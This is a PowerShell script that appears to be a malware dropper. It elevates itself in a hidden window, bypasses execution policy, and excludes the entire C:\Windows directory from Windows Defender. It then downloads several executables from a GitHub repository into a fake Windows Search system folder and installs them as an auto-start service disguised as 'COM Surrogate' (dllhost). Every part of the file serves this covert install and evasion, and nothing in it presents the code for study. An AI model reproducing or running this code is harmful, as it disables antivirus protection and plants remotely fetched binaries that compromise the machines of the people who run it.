function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if (-not (Test-Admin)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
    exit
}
$serviceName = "dllhost"
$downloadDir = "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy"
$windowsDir = "C:\Windows"
$urls = @(
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/dllhost.exe.config",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Newtonsoft.Json.dll",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/tskdllhost.ps1",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/TaskHostSvc.exe",
    "https://raw.githubusercontent.com/Aleksandr020295/Aleksandr_javascript/main/Antimalware Service Core.exe"
)
function Add-WindowsDefenderExclusion {
    param (
        [string]$path
    )
    try {
        Add-MpPreference -ExclusionPath $path
    } catch {
        Write-Error "$_"
    }
}
function Download-File {
    param (
        [string]$Url,
        [string]$Destination
    )
    try {
        Invoke-WebRequest -Uri $Url -OutFile $Destination
    } catch {
        Write-Error "$_"
    }
}
Add-WindowsDefenderExclusion -path $windowsDir
$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
if (-not $service) {
    $servicePath = "C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\dllhost.exe"
    try {
        New-Service -Name $serviceName -DisplayName 'COM Surrogate' -BinaryPathName $servicePath -StartupType 'Automatic'
    } catch {
        Write-Error "$_"
        exit
    }
}
if ($service.Status -ne 'Running') {
    if (-not (Test-Path -Path $downloadDir)) {
        try {
            New-Item -ItemType Directory -Path $downloadDir | Out-Null
        } catch {
            Write-Error "$_"
            exit
        }
    }
    foreach ($url in $urls) {
        $fileName = [System.IO.Path]::GetFileName($url)
        $destination = "$downloadDir\$fileName"
        Download-File -Url $url -Destination $destination
    }
    try {
        Start-Service -Name $serviceName
    } catch {
        Write-Error "$_"
    }
}
